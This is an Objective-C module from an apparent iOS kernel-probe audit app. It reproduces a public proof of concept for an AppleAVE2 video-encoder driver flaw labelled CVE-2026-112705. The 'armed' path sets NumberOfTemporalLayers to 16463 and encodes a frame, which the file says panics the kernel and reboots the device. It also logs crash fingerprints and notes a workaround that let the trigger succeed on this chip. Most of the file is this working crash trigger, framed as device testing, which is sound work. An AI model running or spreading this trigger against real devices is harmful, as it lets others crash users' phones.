#import "KPAuditAVE112705Module.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>

@interface KPAuditAVE112705Module ()
@property (nonatomic, assign) int ntl;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVE112705Module

- (instancetype)initWithTemporalLayers:(int)ntl {
    self = [super init];
    if (self) {
        _ntl = ntl;
        BOOL armed = (ntl >= 16463);
        _identifier = armed
            ? [NSString stringWithFormat:@"ave112705.ntl%d.armed", ntl]
            : [NSString stringWithFormat:@"ave112705.ntl%d", ntl];
        _title = [NSString stringWithFormat:@"AVE2 NTL=%d %@", ntl, armed ? @"(armed)" : @"(control)"];
        _subtitle = armed
            ? @"CVE-2026-112705: first encode with NTL>=16463 panics AppleAVE2 (device WILL reboot)"
            : @"Threshold control: NTL<=16462 must survive per the public PoC";
        _icon = armed ? @"exclamationmark.triangle.fill" : @"video.badge.waveform";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - Journal (fsync before every encode — the panic eats unsaved logs)

- (void)journal:(NSString *)line {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave112705-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    NSData *data = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    [fh writeData:data];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave112705] %@", line];
}

#pragma mark - Trigger (public PoC sequence — note: NO RCMode; it fails -12900
/// on this SoC before the encode and blocked the earlier audit runs)

- (NSDictionary *)runTrigger {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    const int32_t width = 1280, height = 720;

    CFMutableDictionaryRef sourceAttrs = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(sourceAttrs, kCVPixelBufferIOSurfacePropertiesKey, CFDictionaryCreate(NULL, NULL, NULL, 0, NULL, NULL));
    CVPixelBufferRef pixelBuffer = NULL;
    CVReturn cvr = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                                       kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                       sourceAttrs, &pixelBuffer);
    CFRelease(sourceAttrs);
    if (cvr != kCVReturnSuccess || !pixelBuffer) {
        result[@"status"] = @"PIXELBUFFER_FAILED";
        result[@"cv_return"] = @(cvr);
        return result;
    }

    // fill planes with neutral values
    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
    size_t ySize = CVPixelBufferGetBytesPerRowOfPlane(pixelBuffer, 0) * (size_t)height;
    memset(CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0), 0x40, ySize);
    size_t uvSize = CVPixelBufferGetBytesPerRowOfPlane(pixelBuffer, 1) * ((size_t)height / 2);
    memset(CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1), 0x80, uvSize);
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(kCFAllocatorDefault, width, height,
                                                 kCMVideoCodecType_HEVC,
                                                 NULL, NULL, NULL,
                                                 NULL, NULL, &session);
    result[@"session_create_status"] = @(status);
    if (status != noErr || !session) {
        CVPixelBufferRelease(pixelBuffer);
        result[@"status"] = @"SESSION_CREATE_FAILED";
        return result;
    }

    // EncoderUsage=1 — matches the public PoC profile; NO RCMode on purpose.
    int usage = 1;
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));

    int ntl = self.ntl;
    status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"),
                                  (__bridge CFNumberRef)@(ntl));
    result[@"ntl_set_status"] = @(status);
    result[@"ntl"] = @(ntl);

    // read back
    CFNumberRef readback = NULL;
    if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &readback) == noErr && readback) {
        int got = 0;
        CFNumberGetValue(readback, kCFNumberIntType, &got);
        result[@"ntl_readback"] = @(got);
        CFRelease(readback);
    }

    [self journal:[NSString stringWithFormat:
        @"BEFORE_ENCODE[0] ntl=%d session=%p status=%d (panic expected on 27.0.1 per public PoC; "
        @"fingerprint: Kernel data abort in AppleAVE2, far=0x59 x19=0x1, victim videocodecd)",
        ntl, (void *)session, (int)status]];

    CMTime pts = CMTimeMake(0, 30);
    status = VTCompressionSessionEncodeFrame(session, pixelBuffer, pts, kCMTimeInvalid, NULL, NULL, NULL);
    result[@"encode_status"] = @(status);
    [self journal:[NSString stringWithFormat:@"ENCODE_RETURNED[0] status=%d — device survived the first encode", (int)status]];

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    [self journal:@"COMPLETE_FRAMES_RETURNED — no panic"];

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pixelBuffer);
    result[@"status"] = @"SURVIVED";
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AppleAVE2 NTL ===\n"];
    [report appendString:@"Public PoC: MchinaMd57764/AVETemporalPoC (independent repro of Calif/Chollima).\n"];
    [report appendString:@"Trigger: VTCompressionSessionCreate ok -> NumberOfTemporalLayers=16463\n"];
    [report appendString:@"         -> FIRST encode -> Kernel data abort in AppleAVE2+0xDA78.\n"];
    [report appendString:@"Threshold: 16462 survives, 16463 panics (on iPhone18,1; ours is iPhone16,1).\n"];
    [report appendString:@"Fingerprint: far=0x59, x19=0x1 (16464 -> 0x100000059/0x100000001), videocodecd.\n"];
    [report appendString:@"No RCMode is set: RCMode=20 returned -12900 on this SoC and blocked earlier runs.\n"];
    [report appendString:@"WARNING: the armed encode may panic the kernel and reboot the device.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
    [report appendFormat:@"\n%@\n", [self runTrigger]];

    [report appendString:@"\nVERDICT: "];
    [report appendString:self.ntl >= 16463 ? @"SEE_STATUS_FIELD\n" : @"SEE_STATUS_FIELD (control)\n"];
    [report appendString:
     @"status=SURVIVED with ntl=16463 means the first encode did NOT panic on this\n"
     @"device/build — either the threshold differs on T8130 or the encode never\n"
     @"reached the driver (check encode_status / journal). status=SESSION_CREATE_\n"
     @"FAILED means VideoToolbox refused the session entirely.\n"
     @"A panic = the journal's BEFORE_ENCODE[0] line is the last record, and the\n"
     @"device panic log (Kernel data abort, AppleAVE2) is the proof — pull it\n"
     @"after reboot via the crash audit.\n"];
    return report;
}

@end
